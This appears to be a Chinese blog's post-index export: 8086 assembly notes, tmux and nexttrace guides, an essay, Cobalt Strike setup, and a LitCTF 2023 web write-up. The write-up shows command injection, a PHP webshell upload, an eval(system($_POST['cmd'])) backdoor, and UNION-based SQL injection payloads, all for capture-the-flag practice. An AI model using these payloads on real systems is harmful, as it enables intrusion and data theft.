在执行完当前指令后响应中断，引发中断过程；\n如果IF&#x3D;0，则不响应可屏蔽中断。\n\n可屏蔽中断所引发的中断过程，除在第一步的是线上有所不同外，基本上和内中断的中断过程相同。\n可屏蔽中断信息来自于CPU外部，中断类型码是通过数据总线送入CPU的；而内中断的中断类型码是在CPU内部产生的。\n现在，我们可以解释中断过程中将IF置为0的原因了。将IF之0的原因就是，在进入中断处理程序后，禁止其他的可屏蔽中断。\n当然，如果在中断处理程序中需要处理可屏蔽中断，可以用指令将IF置1。\n8086CPU 提供的设置IF的指令如下：\n\nsti，用于设置IF&#x3D;1；\ncli，用于设置IF&#x3D;0。\n\n不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发终端过程。\n对于8086CPU不可屏蔽中断的中断类型码固定为2。所以中断过程中，不需要取中断类型码。\n不可屏蔽中断的中断过程：\n\n标志寄存器入栈，IF &#x3D; 0，TF &#x3D; 0；\nCS、IP 入栈；\n(IP)&#x3D;(8)，(CS)&#x3D;(0AH)。\n\n几乎所有外设引发的中断，都是可屏蔽中断。\n3. PC机键盘的处理过程键盘输入的处理过程：\n\n键盘输入\n引发9号中断\n执行int 9中断例程\n\n键盘上的每一个键相当于一个开关，键盘中有一个芯片对键盘上的每一个键的开关状态进行扫描。\n按下一个键时，开关接通，该芯片就产生一个扫描码，扫描码说明了按下的键在键盘上的位置。扫描码被送入主板上的相关接口芯片的寄存器中，该寄存器的端口地址为60H。\n松开按下的键时，也产生一个扫描码，扫描码说明了松开的键在键盘上的位置。松开按键时产生的扫描码也被送入60H端口中。\n\n\n\n\n\n\n\n\n\n一般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。\n?扫描码长度为一个字节，通码的第7位为0，断码的第7位为1，即：断码 &#x3D; 通码＋80H\n\n键盘输入到达 60h 端口时，相关芯片向 CPU 发出中断类型码为 9 的可屏蔽中断信息，CPU 检测到该中断信息后，若 IF&#x3D;1，引发中断过程，执行 int 9 中断例程。\n执行 int 9 中断例程：\n\n读出 60h 端口中的扫描码；\n如果是字符键，将该扫描码和其对应的 ACII 码送入内存中的 BIOS 缓存区；如果是控制键，则将其转变为状态字节写入内存中存储状态字节的单元。\n对键盘系统进行相关控制。\n\nBIOS键盘缓冲区可以存储15个键盘输入，因为int9中断例程除了接收扫描码外，还要产生和扫描码对应的字符码，所以在BIOS键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码。\n?0040:17 单元存储键盘状态字节，该字节记录了控制键和切换键的状态。键盘状态字节各位记录的信息如下：\n\n0：右shift状态，置1表示按下右shift键；\n1：左shift状态，置1表示按下左shift键；\n2：CTRL状态，置1表示按下CTRL键；\n3：alt状态，置1表示按下alt键；\n4：scroll lock状态，置1表示scroll 指示灯亮；\n5：NumLock状态，置1表示小键盘输入的是数字；\n6：CapsLock状态，置1表示输入大写字母；\n7：insert状态，置1表示处于删除态；\n\n4. 编写int 9中断例程略。\n5. 安装新的int 9中断例程略。\n直接定址表1. 描述了单元长度的标号在代码段中使用标号 code、a、b、start、s 等来标记指令、数据、段的起始地址。\n这些标号仅仅表示了内存单元的地址。\nassume cs:code\ncode segment\n    a: db 1,2,3.4,5,6,7,8\n    b: dw 0\nstart: mov si,offset a\n       mov bx,offest b\n       mov cx,8\n    s: mov al,cs:[si]\n       mov ah,0\n       add cs:[bx],ax\n       inc si\n       loop s\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n还可以使用一种标号，标号后面没有 “:”，这种标号不但表示内存单元的地址，还表示了内存单元的长度，即表示在此标号处的单元，是一个字节单元、还是子单元，还是双字单元。\nassume cs:code\ncode segment\n    a db 1,2,3.4,5,6,7,8\n    b dw 0\nstart: mov si,0\n       mov cx,8\n    s: mov al,a[si]\n       mov ah,0\n       add b,ax\n       inc si\n       loop s\n       mov ax,4c00h\n       int 21h\ncode ends\nend start\n\n因为这种标号包含了对于单元长度的描述，所以在指令中，它可以代表一个段中的内存单元。\n比如，对于程序中的 “b dw 0”：\n\nmov ax,b  相当于 mov ax,cs:[8]\nmov b,2   相当于 mov word ptr cs:[8],2\ninc b     相当于 inc word ptr cs:[8]\n\n这些指令中，标号 b 代表了一个内存单元，地址为 code:8，长度为两个字节。\n\n使用这种包含单元长度的标号，可以使我们以简洁的形式访问内存中的数据。\n这种标号称为数据标号，标记了存储数据的单元的地址和长度。\n不同于仅仅表示地址的地址标号。\n\n2. 在其他段中使用数据标号一般来说，不在代码段中定义数据，而是将数据定义到其他段中。\n在其他段中，我们也可以使用数据标号来描述存储数据的单元的地址和长度。\n注意：在后面加有 “：” 的地址标号，只能在代码段中使用，不能在其他段中使用。\n如果想在代码段中直接使用数据标号访问数据，则需要使用伪指令 assume 将标号所在的段和一个段寄存器联系起来。\n否则编译器编译的时候，无法确定标号的段地址在哪一个寄存器中。\n当然，这种联系是编译器的工作需要，但绝不是说，我们因为编译器的工作需要，用assume指令将段寄存器和某个段相联系，段寄存器中就会真的存放该段的地址。\n我们可以将标号当作数据来定义，此时，编译器将标号所表示的地址当作数据的值。\n\n比如：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw a,bdata ends\n\n数据标号c处存储的两个字型数据为标号a、b的偏移地址。\n\n相当于：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw offset a,offset bdata ends\n\n再比如：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dd a,bdata ends\n\n\n数据标号c处存储的两个双字型数据为标号a的偏移地址和段地址、标号b的偏移地址和段地址。\n\n相当于：data segmenta db 1,2,3,4,5,6,7,8b dw 0c dw offset a,seg a,offset b,seg bdata ends\n\nseg操作符，功能为取得某一标号的段地址。\n3. 直接定址表用查表的方法编写相关程序的技巧：\n编写子程序，以十六进制的形式在屏幕中显示给定的字节型数据。\n分析:\n\n一个字节需要用两个十六进制数码来表示，所以需要在屏幕上显示两个ASCII字符\n\n数值0~9和字符”0“ ~ ”9“之间的映射关系:数值+30h&#x3D;对于字符的ASCII值\n\n数值10~15和字符”A“ ~ ”F“之间的映射关系:数值+37h&#x3D;对于字符的ASCII值\n\n可以利用数值和字符之间的这种原本存在的映射关系，通过高4位和低4位值得到对应的字符码\n\n\n但是由于映射关系不同，我们在程序中不许进行一些比较，对于大于9的数值，我们要用不同的计算方法。我们希望用更简捷的算法，就要考虑用同一种映射关系从数值得到字符码。\n具体的做法是，我们建立一张表，表中依次存储字符”0” ~ ”F”,我们可以通过数值0~15直接查找对应的字符\n可以在直接定址表中存储子程序的地址，方便地实现不同子程序的调用。\n子程序如下：\n;用 al 传送要显示的数据\nshowbyte:   jmp short show\n            show db &#39;0123456789ABCDEF&#39;    ;字符表\n    show:    push bx\n            push es\n\n            mov ah,al\n            shr ah,1\n            shr ah,1            \n            shr ah,1            \n            shr ah,1                ;右移 4 位，ah 中得到高 4 位的值\n            and al,00001111b         ;al 中为低 4 位的值\n\n            mov bl,ah\n            mov bh,0\n            mov ah,table[bx]         ;用高 4 位的值作为相对于 table 的偏移，取得对应的字符\n\n            mov bx,0b800h\n             mov es,bx\n             mov es:[160*12+40*2],ah \n\n             mov bl,al\n             mov bh,0\n             mov al,table[bx]        ;用低 4 位的值作为相对于 table 的偏移，取得对应的字符\n\n            mov es:[160*12+40*2+2],al\n\n            pop es\n            pop bx\n\n            ret\n\n子程序中，在数值 0~15 中和字符 “0” ~ “F” 之间建立的映射关系位：以数值 N 为 table 表中的偏移，可以找到对应的字符。\n利用查表的方式的目的一般来说有三个：（1）为了算法的清晰和简洁；（2）为了加快运算速度；（3）为了使程序易于扩充。\n4。 程序入口地址的直接定址表可以在直接定址表中存储子程序的地址，方便实现不同子程序的调用。\n实现一个子程序setscreen，为显示输出提供如下功能：\n\n清屏，\n设置前景色，\n设置背景色，\n向上滚动一行\n\n入口参数:（1）用ah传递功能号：\n\n0 表示清屏\n1 表示设置前景色\n2 表示设置背景色\n3表示向上滚动一行\n\n（2）对于2，3号功能，用al传递颜色值 (al)属于{0，1，2，3，4，5，6，7}\n功能实现：\n\n清屏：\n将显存中当前屏幕中的字符设为空格符；\n\n\n设置前景色：\n设置显存中当前屏幕中处于奇地址的属性字节的第0，1，2位；\n\n\n设置背景色：\n设置显存中当前屏幕中处于奇地址的属性字节的第4，5，6位；\n\n\n向上滚动一行:\n依次将n+1行的内容复制到第n行处，最后一行为空；\n\n\n\n&#x2F;&#x2F; 功能子程序1：清屏\nsub1:   push bx\n        push cx\n        push es\n        mov bx,0b800h\n        mov es,bx\n        mov bx,0\n        mov cx,2000\nsub1s:  mov byte ptr es:[bx],&#39; &#39;\n        add bx,2\n        loop subls\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序2：设置前景色\nsub2:   push bx\n        push cx\n        push es\n\n        mov bx,0b800h\n        mov es,bx\n        mov bx,1\n        mov cx,2000\nsub2s:  and byte ptr es:[bx],11111000b\n        or es:[bx],al\n        add bx,2\n        loop sub2s\n\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序3：设置背景色\nsub3:   push bx\n        push cx\n        push es\n        mov cl,4\n        shl al,cl\n        mov bx,0b800h\n        mov es,bx\n        mov bx,1\n        mov bx,2000\nsub3s:  and byte ptr es:[bx],10001111b\n        or es:[bx],al\n        add bx,2\n        loop sub3s\n\n        pop es\n        pop cx\n        pop bx\n        ret\n\n&#x2F;&#x2F; 功能子程序4：向上滚动一行\nsub4:   push cx\n        push si\n        push di\n        push es\n        push ds\n\n        mov si,0b800h\n        mov es,si\n        mov ds,si\n        mov si,160                  ;ds:si指向第n+1行\n        mov di,0                    ;es:di指向第n行\n        cld\n        mov cx,24                   ;共复制24行\nsub4s:  push cx\n        mov cx,160\n        rep movsb                   ;复制\n        pop cx\n        loop sub4s\n\n        mov cx,80\n        mov si,0\nsub4s1: mov byte ptr [160*24+si],&#39; &#39;    ;最后一行清空\n        add si,2\n        loop sub4s1\n\n        pop ds\n        pop es\n        pop di\n        pop si\n        pop cx\n        ret\n\n可以将这些功能子程序的入口地址存储在一个表中，它们在表中的位置和功能号相对应。\n对应的映射关系:功能号*2&#x3D;对应的功能子程序在地址表中的偏移\nsetscreen:  jmp short set\n\n    table   dw sub1,sub2,sub3,sub4\n\n    set:    push bx\n\n            cmp ah,3            ;判断功能号是否大于3\n            ja sret\n            mov bl,ah\n            mov bh,0\n            add bx,bx           ;根据ah中的功能号计算对应子程序在table中的偏移\n\n            call word ptr table[bx]         ;调用对应的功能子程序\n\n    sret:   pop bx\n            iret \n\n用通过比较功能号进行转移的方法，程序结构比较混乱，不利于功能的扩充。\n用根据功能号查找地址表的方法，程序的结构清晰，便于补充。\n使用BIOS进行键盘输入和磁盘读写\n大多数的程序都需要用户的输入，键盘输入是最基本的输入。\n\n程序和数据通常需要长期存储，磁盘是最常用的存储设备。\n\nBIOS为这两种外设的I&#x2F;O提供了最基本的中断例程。\n\n\n键盘输入将引发9号中断，BIOS提供了int 9中断例程。\nCPU在9号中断发生后，执行int 9中断例程，从60h端口读出扫描码，并将其转化为相应的ASCII码或状态信息，存储在内存的指定空间（键盘缓冲区或状态字节）中。\n所以，一般的键盘输入，在CPU执行完int 9中断例程后，都放到了键盘缓冲区中。\n\n键盘缓冲区中有16个字单元，可以存储15个按键的扫描码和对应的ASCII码。高位字节是扫描码，低位字节是字符码。\n\n状态字节存放在0040:17单元。该字节记录了控制键和切换键的状态。\n\n\n1. int 9中断例程对键盘输入的处理键盘输入将引发9号中断，BIOS提供了int 9中断例程。CPU在9号中断发生后，执行9号中断例程，从60号端口读出扫描码，将其转化为相应的ASCII码或者状态信息，存储在内存的指定空间(键盘缓冲区或状态字节)中。eg:简述Shift_A(1). 按下左Shift键，引发键盘中断；int 9中断例程接受左Shift键的通码，设置0040:17处的状态字节的第1位为1，表示左Shift键按下。(2). 按下A键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出A键的通码；检测状态字节，看看是否有切换键按下，发现左Shift键被按下，则将A键的扫描码1Eh和Shift_A对应的ASCII码，即大”A”的ASCII码41h，写入键盘缓冲区。(3). 松开左Shift键，引发键盘中断；int 9中断例程接受左Shift键的断码，设置0040:17处的状态字节的第1位为0，表示左Shift键松开。\n2. 使用 int 16h中断例程读取键盘缓冲区int 16h中断例程中包含的一个最重要的功能是从键盘缓冲区中读取一个键盘输入，该功能的编号为0。\n下面的指令从键盘缓冲区中读取一个键盘输入并且将其从缓冲区中删除：mov ah, 0int 16h结果: (ah)&#x3D;扫描码，(al)&#x3D;ASCII码。\nint 16h中断例程检测键盘缓冲区，发现缓冲区空，则循环等待，直到缓冲区中有数据。\nint 16h中断例程的0号功能，进行如下工作。(1) 检测到键盘缓冲区是否有数据；(2) 没有继续做第一步；(3) 读取缓冲区第一个字单元中的键盘输入；(4) 将读取的扫描码送入ah，ASCII码送入al；(5) 将已读取得键盘输入从缓冲区中删除。\n可见，BIOS的int 9中断例程和int 16h中断例程是一堆相互配合的程序，int 9中断例程向键盘缓冲区中写入，int 16h中断例程从缓冲区中读出。\n它们写入和读出的时机不同，int 9中断例程在有键按下的时候向键盘缓冲区中写入数据；而int 16h中断例程是在应用程序对其进行调用的时候，将数据从键盘缓冲区中读出。\n3. 字符串的输入字符串的输入，用户通过键盘输入的通常不仅仅是单个字符而是字符串。我们初步的了解一下。最基本的字符串输入程序，需要具备下面的功能。\n(1) 在输入的同时需要显示这个字符串；\n(2) 一般在输入回车符后，字符串输入结束；\n(3) 能够删除已经输入的字符。\n编写一个接受字符串的输入子程序，实现上述三个基本功能。因为在输入的过程中需要显示，子程序的参数如下：\n\n（dh）、（dl）&#x3D; 字符串在屏幕上显示的行、列位置；\nds:si指向字符串的存储空间，字符串以0为结尾符。\n\n（1）字符串的输入和删除每个新输入的字符都存储在前一个输入的字符之后，而删除是从最后面的字符进行的。可以看出在字符串输入的过程中，字符的输入和输出是按照栈的访问规则进行的，即后进先出。这样，我们呢就可以用栈的方式来管理字符串的存储空间，也就是说，字符串的存储空间实际上是一个字符栈。字符栈中的所有字符，从栈底到栈顶，组成一个字符串。\n（2）在输入回车符后，字符串输入结束。输入回车符后，我们可以在字符串中加入0，表示字符串结束。\n（3）在输入的同时需要显示这个字符串。每次有新的字符输入和删除一个字符的时候，都应该重新显示字符串，即从字符栈的栈底到栈顶，显示所有的字符。\n（4）程序的处理过程。\n\n调用int 16h读取键盘输入；\n如果是字符，进入字符栈，显示字符栈中的所有字符；继续执行1；\n如果是退格键，从字符栈中弹出一个字符，显示字符栈中的所有字符；继续执行1；\n如果是Enter键，向字符栈中压入0，返回。\n\n子程序：字符栈的入栈、出栈和显示。参数说明：\n\n（ah）&#x3D; 功能号，0表示入栈，1表示出栈，2表示显示；\nds:si栈项字符栈空间\n对于0号功能：（al）&#x3D; 入栈字符；\n对于1号功能：（al）&#x3D; 返回的字符；\n对于2号功能：（dh）、（dl）&#x3D; 字符串在屏幕上显示的行、列位置。\n\n\n\n4. 应用int 13h中断例程对磁盘进行读写3.5英寸软盘分为上下两面，每面有80个磁道，每个磁道又分为18个扇区，每个扇区的大小为512个字节。\n??则：2面80磁道18扇区*512字节&#x3D;1440KB~&#x3D;1.44MB\n??磁盘的实际访问由磁盘控制器进行，我们可以通过控制磁盘控制器来访问磁盘。只能以扇区为单位对磁盘进行读写。在读写扇区的时候，要给出面号、磁道号和扇区号。面号和磁道号从0开始，而扇区号从1开始。\n??如果我们通过直接控制磁盘控制器来访问磁盘，则需要涉及许多硬件细节。BIOS提供了对扇区进行读写的中断例程，这些中断例程完成了许多复杂的和硬件相关的工作。我们可以通过调用BIOS中断例程来访问磁盘。\n??BIOS提供的访问磁盘的中断例程为int 13h。\n\n\n返回参数：\n\n操作成功：（ah）&#x3D; 0，（al）&#x3D; 写入的扇区数\n操作失败：（ah）&#x3D; 出错代码\n\n注意：直接向磁盘扇区写入数据是很危险的，很可能覆盖掉重要数据。\n","slug":"8086汇编_08","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"d8fb11b13d282a9b57aaf892123ba8a3","title":"关于vim 的使用","content":"\n\n\n\n\n\n\n\n\n很喜欢某位师傅的一句话：“IDE有IDE的职责，Editor有Editor的职责，没必要非把一个变成另外一个。”\n","slug":"工具_Vim","date":"2023-06-01T12:30:34.000Z","categories_index":"工具","tags_index":"vim","author_index":"南瓜の无名"},{"id":"eb84d15d71fcc835a097211677443619","title":"nexttrace使用","content":"\n用法：\nnexttrace [-h | --help] \n[-T | --tcp] \n[-U | --udp] \n[-F | --fast-trace] \n[-p | --port &lt;整数&gt;] \n[-q | --queries &lt;整数&gt;] \n[--parallel-requests &lt;整数&gt;] \n[-m | --max-hops &lt;整数&gt;] \n[-d | --data-provider (Ip2region | ip2region | IP.SB | ip.sb | IPInfo | ipinfo | IPInsight | ipinsight | IPAPI.com | ip-api.com | IPInfoLocal | ipinfolocal | chunzhen | LeoMoeAPI | leomoeapi | disable-geoip)] \n[-n | --no-rdns] \n[-a | --always-rdns] \n[-P | --route-path] \n[-r | --report] \n[--dn42] \n[-o | --output] \n[-t | --table] \n[--raw] \n[-j | --json] \n[-c | --classic] \n[-f | --first &lt;整数&gt;] \n[-M | --map] \n[-v | --version] \n[-s | --source &quot;&lt;值&gt;&quot;] \n[-D | --dev &quot;&lt;值&gt;&quot;] \n[-R | --route] \n[-z | --send-time &lt;整数&gt;] \n[-i | --ttl-time &lt;整数&gt;] \n[_positionalArg_nexttrace_27 &quot;&lt;值&gt;&quot;] \n[--dot-server（dnssb | aliyun | dnspod | google | cloudflare）] \n[-g | --language（en | cn）]\n\n参数：\n\n  -h  --help                         打印帮助信息\n  -T  --tcp                          使用TCP SYN跟踪路由（默认端口为80）\n  -U  --udp                          使用UDP SYN跟踪路由（默认端口为53）\n  -F  --fast-trace                   一键快速跟踪到中国ISP(网络业务提供商)的网络路由\n  -p  --port                         设置目标端口。它可以是“default”方法的初始UDP端口值（每个探测器逐步增加，默认为33434），也可以是“icmp”的初始seq（也逐步增加，默认为1），或者是其他方法的某个常量目标端口（默认为80，“tcp”，53，“udp”等）。\n  -q  --queries                      设置每个跳点的探测次数。默认值：3\n      --parallel-requests            设置ParallelRequests数量。当有多个路由时应为1。默认值：18\n  -m  --max-hops                     设置最大跳数（达到的最大TTL）。默认值：30\n  -d  --data-provider                选择IP地理数据提供程序[IP.SB、IPInfo、IPInsight、IP-API.com、Ip2region、IPInfoLocal、CHUNZHEN、disable-geoip]。默认值：LeoMoeAPI\n  -n  --no-rdns                      不将IP地址解析为其域名\n  -a  --always-rdns                  始终将IP地址解析为其域名\n  -P  --route-path                   按ASN和位置打印跟踪路线\n  -r  --report                       使用报告模式输出\n      --dn42                         DN42模式\n  -o  --output                       将跟踪结果写入文件（仅适用于RealTimePrinter）\n  -t  --table                        将跟踪结果输出为表格\n  --raw                              输出易于解析的输出\n  -j  --json                         将跟踪结果输出为JSON\n  -c  --classic                      经典输出跟踪结果，如BestTrace\n  -f  --first                        从第一个ttl跳点开始（而不是从1开始）。默认值：1\n  -M  --map                          禁用打印跟踪地图\n  -v  --version                      打印版本信息并退出\n  -s  --source                       使用源src_addr发送出站数据包\n  -D  --dev                          使用以下网络设备作为出站数据包中的源地址\n  -R  --route                        显示路由表[由BGP.Tools提供]\n  -z  --send-time                    设置发送每个数据包的时间间隔。当一些路由器使用ICMP消息的速率限制时，这很有用。默认值：100\n  -i  --ttl-time                     设置按TTL发送数据包组的时间间隔。当一些路由器使用ICMP消息的速率限制时，这很有用。默认值：500\n      --_positionalArg_nexttrace_25  IP地址或域名\n      --dot-server                   用于DNS解析的DoT服务器[dnssb、aliyun、dnspod、google、cloudflare]\n  -g  --language                     选择显示语言[en、cn]。默认值：cn","slug":"工具_nexttrace","date":"2023-05-31T12:30:34.000Z","categories_index":"工具","tags_index":"渗透工具","author_index":"南瓜の无名"},{"id":"29c699d8af0c369a8f79cedaf6bf409d","title":"使用tmux命令行分屏","content":"安装sudo apt-get install tmux # 安装tmux\n\n基本使用tmux\n\n输入tmux打开新的终端，底部会有一行绿色的长条。\n\n\n\n\n\n\n\n\n\n先按住CTRL+b，松开，再按 Shift + 5 或者  Shift+’ 进行左右分屏或上下分屏，不要同时按！\n其他命令同理，先按Ctrl+b，松开。\n\n左右分屏：tmux split-pane -h 对应快捷键： Ctrl+%\n\n上下分屏：tmux spilt-pane -v 对应快捷键： Ctrl+”\n\n查看各个分屏（pane）的编号： 快捷键： Ctrl + q\n\nCtrl+b 然后按o（小写O），就可以切到下一个pane。\n\nCtrl+b 然后按； 就可以切换到上一个pane。\n\n\n其他快捷键基本操作? 列出所有快捷键；按q返回\nd 脱离当前会话,可暂时返回Shell界面\ns 选择并切换会话；在同时开启了多个会话时使用\nD 选择要脱离的会话；在同时开启了多个会话时使用\n: 进入命令行模式；此时可输入支持的命令，例如 kill-server 关闭所有tmux会话\n[ 复制模式，光标移动到复制内容位置，空格键开始，方向键选择复制，回车确认，q&#x2F;Esc退出\n] 进入粘贴模式，粘贴之前复制的内容，按q&#x2F;Esc退出\n~ 列出提示信息缓存；其中包含了之前tmux返回的各种提示信息\nt 显示当前的时间\nctrl + z 挂起当前会话\n\n窗口操作c 创建新窗口\n&amp; 关闭当前窗口\n[0-9] 数字键切换到指定窗口\np 切换至上一窗口\nn 切换至下一窗口\nl 前后窗口间互相切换\nw 通过窗口列表切换窗口\n, 重命名当前窗口，便于识别\n. 修改当前窗口编号，相当于重新排序\nf 在所有窗口中查找关键词，便于窗口多了切换\n\n面板操作&quot; 将当前面板上下分屏\n% 将当前面板左右分屏\nx 关闭当前分屏\n! 将当前面板置于新窗口,即新建一个窗口,其中仅包含当前面板\nctrl+方向键 以1个单元格为单位移动边缘以调整当前面板大小\nalt+方向键 以5个单元格为单位移动边缘以调整当前面板大小\nq 显示面板编号\no 选择当前窗口中下一个面板\n方向键 移动光标选择对应面板\n&#123; 向前置换当前面板\n&#125; 向后置换当前面板\nalt+o 逆时针旋转当前窗口的面板\nctrl+o 顺时针旋转当前窗口的面板\nz 最大化当前所在面板\npage up 向上滚动屏幕，q 退出\npage down 向下滚动屏幕，q 退出\n\n\n\n\n\n\n\n\n\n\nhttps://www.ruanyifeng.com/blog/2019/10/tmux.html\n","slug":"工具_tmux","date":"2023-05-31T12:30:34.000Z","categories_index":"工具","tags_index":"渗透工具","author_index":"南瓜の无名"},{"id":"a1d695094e9aa3c3a7c4f837b1ce6fd6","title":"web[LitCTF2023] 郑州轻工业大学首届网络安全赛wp","content":"1.我Flag呢？\n2.导弹迷踪\n3.Follow me and hack me\n4.Ping\n\n前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）\n\n并将抓到的包进行我们需要的修改，”127.0.0.1|ls”，执行ls命令,可以执行,\n\n\n发现flag文件,直接cat，就可以读取\n\n5.PHP是世界上最好的语言！！\n题目提示flag位于根目录，直接去根目录找就行，然后直接cat就能拿到flag\n\n6.作业管理系统查看页面源代码，提示默认账户admin admin，登录进入作业管理系统，发现上传文件的功能，猜测存在文件上传漏洞，上传php一句话木马，\n\n使用蚁剑连接，访问上传木马1.php，连接成功，\n\n\n发现根目录下存在flag文件，读取flag文件得到flag\n\n7.Vim yyds\n访问xxx&#x2F;.index.php.swp下载泄露的备份文件\n\n整理后的代码如下：\n&lt;?php\nerror_reporting(0);             \n$password &#x3D; &quot;Give_Me_Your_Flag&quot;;             \necho &quot;&lt;p&gt;can can need Vim &lt;&#x2F;p&gt;&quot;;             \n&#123;             \nif ($_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; base64_encode($password)) \necho &quot;&lt;p&gt;Oh You got my password!&lt;&#x2F;p&gt;&quot;;             \neval(system($_POST[&#39;cmd&#39;]));                 \n&#125;                 \n?&gt;             \n\n\n按照要求post提交password和cmd，在根目录发现flag\n\n8.这是什么？SQL ！注一下 ！1)))))) or 1&#x3D;1#\n\n然后,恭喜你，就得到了一个假的flag。\n1)))))) order by 2 #\n\n输入3返回值为0，\n1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#\n爆库：information_schema,mysql,ctftraining,performance_schema,test,ctf\n1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;ctftraining&quot;#\n爆表：flag,news,users\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;flag&quot;#\n爆列名：flag\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n9.Http pro max plus\n可恶，加了个xff。被嘲讽了。不过没关系，还有很多办法。\nclient-ip: 127.0.0.1\n\n\nemmm，也许还有更简单粗暴的方法，但是。\nReferer:pornhub.com\n\n\nUser-Agent: Chrome\n\n\n代理的请求头：\n\nHTTP请求头大全,HTTP头信息包括通用头、请求头、响应头和实体头四个部分：https://stackoverflow.org.cn/httpheader/\nvia: Clash.win\n\n\n\n三个链接我帮大家都看过了，没有好康的，但是拿到flag就不亏。\n\n10.1zjs\n是f1ag，不是flag，慢慢找吧，js代码有点多。然后访问&#x2F;&#102;&#64;&#107;&#51;&#102;&#x31;&#97;&#103;&#x2e;&#x70;&#104;&#112;，把代码全部复制到控制台回车。\njs fuck：\n11.就当无事发生社工题，给了链接 https://ProbiusOfficial.github.io ，打开后发现是探姬的博客，翻到最底下hexo，搭建过博客就想到github（唔，加上背景图片博客很好看，但是我截图的时候图片没加载出来）\n\n利用github搭建的hexo博客有固定格式：https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/\n\n历史记录有删掉的版本，不出意外就在这里面就有flag。\n\n12.Flag点击就送！flask-session-cookie-manager工具下载：https://github.com/noraj/flask-session-cookie-manager\nusage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s &lt;string&gt;, --secret-key &lt;string&gt;\n                        Secret key\n  -t &lt;string&gt;, --cookie-structure &lt;string&gt;\n                        Session cookie structure\n\n\n13.彩蛋彩蛋分布于  Follow me and hack me  作业管理系统 狠狠的注入 四个题目 中\n\n1.我Flag呢:在script.min.js可以找到。\n\nLitCTF&#123;First_t0_The_k3y! (1&#x2F;?) \n\n2.作业管理系统：\n_S0_ne3t? (2&#x2F;?)\n\n3.Follow me and hack me:\n提示说有备份文件很好吃。\n备份文件常见的后缀名:\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n常见的网站源码备份文件名：\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\nwww.zip，手动尝试吧，脚本没跑出来，全是200。\n\n_R3ady_Pl4yer_000ne_ (3&#x2F;?)\n\n4.狠狠的注入:\n\nF1rst_to_Th3_eggggggggg!&#125; (4&#x2F;4)\n\nall.四个合在一起得到彩蛋的完整flag：\nNSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;\n","slug":"wp_Litctf 2023","date":"2023-05-16T15:45:17.000Z","categories_index":"文章","tags_index":"LitCTF,wp","author_index":"南瓜の无名"},{"id":"d183dfb007b882d9bb397f4054d5a867","title":"2023首届盘古石杯结束后的随想","content":"刚刚结束了“盘古石”杯电子取证的比赛，是一场很精彩的比赛，数字取证也许漫长而枯燥，但是对于我这种同样无趣的人来说，反而是一种乐趣。看着发光的电脑屏幕，突然有一种想哭的感觉，似乎是什么都没有改变，一切又已经截然不同。同样是题目做不出来，同样是临近收卷时的心悸，可是却已波澜不惊。我担心，这已经是一种习惯了，但是桌面留下的痕迹告诉我不是。因为报名的晚，所以是一个人参与的，理论上五个小时的话，如果很厉害的人是可以都做完的。显然，我不是很厉害的人。承认自己会失败时很重要的，但更重要的时学习如何去弥补，我想对曾经逃避不敢正视未来的自己说，你真棒，完成了第一步，然后，剩下的答案就交给当下的我去书写吧。能做出来的题都是一眼能看出来答案的题目，但是从纷乱的数据中找出线索很有成就感，可不是谁都可以连续五个小时坐在电脑前一动不动盯着屏幕的！尝试真的很重要，记得第一次护网面试的时候紧张的语无伦次，第二次就已经可以泰然处之了。如果尝试过后所获得的经验远大于面对未知的恐惧，那么少年，勇敢的向前走吧！无论是盘古石还是火眼，数字取证的工具都很好用，但是正确的使用方法也很重要，错误的使用工具大概是每一个初学者都会犯的错误，比如我。有一些题目如果晚一些交就好了，明明可以作对的，有些不该犯的错误要避免。下一次，会更好的。就像人来人往的街道一般，感觉时间过的好快，最近都有些忙不过来，放弃是很简单的一件事，可是真的放弃了，反而会怅然若失吧。嗯，是时间去做一些更有意义的事情了，我收起了电脑，我的达摩克利斯之剑，挺身站起——也许有一天，这个世界真的会因为我的改变，没有了哭声。\n","slug":"盘古石赛后感","date":"2023-05-06T07:49:36.000Z","categories_index":"无用空间","tags_index":"随想","author_index":"南瓜の无名"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-05-05T05:50:17.266Z","categories_index":"test","tags_index":"test","author_index":"南瓜の无名"},{"id":"683422935a9a4a685de276df60649fb9","title":"windows下cobaltstrike的简单使用笔记（汉化版）","content":"1.配置和启动配置teamserver，需要root权限。\n\n.&#x2F;teamserver &lt;host&gt; &lt;password&gt; [&#x2F;path&#x2F;to&#x2F;c2.profile] 